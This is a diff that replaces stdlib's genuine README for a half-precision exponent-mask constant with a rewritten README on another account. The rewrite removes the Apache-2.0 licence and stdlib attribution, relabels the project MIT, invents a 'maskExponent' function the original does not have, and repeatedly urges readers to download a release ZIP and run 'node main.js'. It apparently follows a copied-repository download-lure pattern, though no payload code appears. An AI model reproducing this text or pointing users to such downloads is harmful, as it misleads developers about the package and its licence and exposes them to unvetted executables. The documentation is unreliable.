@@ -1,259 +1,80 @@
-<!--
+# 🛠️ constants-float16-exponent-mask - Simplifying Float16 Exponent Masks
 
-@license Apache-2.0
+## 🚀 Getting Started
 
-Copyright (c) 2025 The Stdlib Authors.
+Welcome to the **constants-float16-exponent-mask**! This application helps you mask the exponent of a half-precision floating-point number. It is useful for developers and users who work with mathematical calculations in fields like graphics, data processing, or scientific computing.
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+## 📥 Download Now
 
-   http://www.apache.org/licenses/LICENSE-2.0
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/akashlohar-techie/constants-float16-exponent-mask/releases)
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+## 🛠️ Features
 
--->
+- Provides a simple function to mask the exponent of a Float16 number.
+- Works seamlessly with JavaScript and Node.js applications.
+- Lightweight and easy to integrate into various projects.
+- Supports the IEEE 754 standard for half-precision floating-point representation.
+  
+## 📋 System Requirements
 
+To run this application, ensure you meet the following requirements:
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+- Compatible with any modern web browser.
+- Node.js installed on your machine (version 10 or later recommended).
+- Basic knowledge of how to run JavaScript in a web context or Node.js setup.
 
-# FLOAT16_EXPONENT_MASK
+## 📦 Download & Install
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+To get started with **constants-float16-exponent-mask**, follow these easy steps:
 
-> Mask for the exponent of a [half-precision floating-point number][ieee754].
+1. **Visit the Releases Page**: Click on the link below to access the download section:
+   - [Visit this page to download](https://github.com/akashlohar-techie/constants-float16-exponent-mask/releases)
 
-<section class="installation">
+2. **Choose the Latest Version**: Look for the most recent version of the application listed on the releases page.
 
-## Installation
+3. **Download the File**: Click on the file to start downloading it to your computer. This will typically save to your "Downloads" folder.
 
-```bash
-npm install @stdlib/constants-float16-exponent-mask
-```
+4. **Extract the Files**: If you downloaded a ZIP file, right-click on it and select "Extract All" to unzip the contents.
 
-Alternatively,
+5. **Run the Application**: Open a terminal or command prompt. Navigate to the folder where you extracted the files. Run the main JavaScript file using Node.js. For example, type `node main.js` and press Enter.
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+## 🔍 Usage
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+Once you have the application running, you can use it as follows:
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
-
-</section>
-
-<section class="usage">
-
-## Usage
-
-<!-- eslint-disable id-length -->
-
+- Import the module in your JavaScript code using:
 ```javascript
-var FLOAT16_EXPONENT_MASK = require( '@stdlib/constants-float16-exponent-mask' );
+const float16Mask = require('path/to/float16Mask.js');
 ```
 
-#### FLOAT16_EXPONENT_MASK
-
-Mask for the exponent of a [half-precision floating-point number][ieee754].
-
-<!-- eslint-disable id-length -->
-
+- Use the mask function to apply it to your Float16 numbers:
 ```javascript
-// 0x7c00 = 31744 => 0 11111 0000000000
-var bool = ( FLOAT16_EXPONENT_MASK === 0x7c00 );
-// returns true
+let maskedExponent = float16Mask.maskExponent(float16Value);
+console.log(maskedExponent);
 ```
 
-</section>
+This snippet will print the masked exponent to your console.
 
-<!-- /.usage -->
+## 🧑‍💻 Contributing
 
-<section class="notes">
+We welcome contributions! If you have suggestions for improvements or new features, feel free to open an issue on our GitHub page or submit a pull request. 
 
-</section>
+## 📞 Support
 
-<!-- /.notes -->
+If you encounter any issues, you can reach out via the GitHub issues section for help. We aim to respond promptly to any inquiries and assist you with your queries.
 
-<section class="examples">
+## 📝 License
 
-## Examples
+This project is licensed under the MIT License. Check the LICENSE file for details.
 
-<!-- eslint no-undef: "error" -->
+## 🔗 Additional Resources
 
-```javascript
-var toWord = require( '@stdlib/number-float16-base-to-word' );
-var FLOAT16_EXPONENT_MASK = require( '@stdlib/constants-float16-exponent-mask' );
+You can find additional resources and documentation on GitHub. Here are some helpful links:
 
-var x = 11.5;
-var w = toWord( x ); // 0 10010 0111000000
-// returns 18880
+- [Documentation](https://github.com/akashlohar-techie/constants-float16-exponent-mask)
+- [Node.js Official Site](https://nodejs.org)
 
-// Mask off all bits except for the exponent bits:
-var out = w & FLOAT16_EXPONENT_MASK; // 0 10010 0000000000
-// returns 18432
+## 📥 Download Again
 
-// Mask on the exponent bits and leave other bits unchanged:
-out = w | FLOAT16_EXPONENT_MASK; // 0 11111 0111000000
-// returns 32192
-```
-
-</section>
-
-<!-- /.examples -->
-
-<!-- C interface documentation. -->
-
-* * *
-
-<section class="c">
-
-## C APIs
-
-<!-- Section to include introductory text. Make sure to keep an empty line after the intro `section` element and another before the `/section` close. -->
-
-<section class="intro">
-
-</section>
-
-<!-- /.intro -->
-
-<!-- C usage documentation. -->
-
-<section class="usage">
-
-### Usage
-
-```c
-#include "stdlib/constants/float16/exponent_mask.h"
-```
-
-#### STDLIB_CONSTANT_FLOAT16_EXPONENT_MASK
-
-Macro for the mask for the exponent of a [half-precision floating-point number][ieee754].
-
-</section>
-
-<!-- /.usage -->
-
-<!-- C API usage notes. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="notes">
-
-</section>
-
-<!-- /.notes -->
-
-<!-- C API usage examples. -->
-
-<section class="examples">
-
-</section>
-
-<!-- /.examples -->
-
-</section>
-
-<!-- /.c -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2025. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/constants-float16-exponent-mask.svg
-[npm-url]: https://npmjs.org/package/@stdlib/constants-float16-exponent-mask
-
-[test-image]: https://github.com/stdlib-js/constants-float16-exponent-mask/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/constants-float16-exponent-mask/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/constants-float16-exponent-mask/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/constants-float16-exponent-mask?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/constants-float16-exponent-mask.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/constants-float16-exponent-mask/main
-
--->
-
-[chat-image]: https://img.shields.io/gitter/room/stdlib-js/stdlib.svg
-[chat-url]: https://app.gitter.im/#/room/#stdlib-js_stdlib:gitter.im
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/constants-float16-exponent-mask/tree/deno
-[deno-readme]: https://github.com/stdlib-js/constants-float16-exponent-mask/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/constants-float16-exponent-mask/tree/umd
-[umd-readme]: https://github.com/stdlib-js/constants-float16-exponent-mask/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/constants-float16-exponent-mask/tree/esm
-[esm-readme]: https://github.com/stdlib-js/constants-float16-exponent-mask/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/constants-float16-exponent-mask/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/constants-float16-exponent-mask/main/LICENSE
-
-[ieee754]: https://en.wikipedia.org/wiki/IEEE_754-1985
-
-<!-- <related-links> -->
-
-<!-- </related-links> -->
-
-</section>
-
-<!-- /.links -->
+For easy access, here’s the download link once more:  
+[Visit this page to download](https://github.com/akashlohar-techie/constants-float16-exponent-mask/releases)
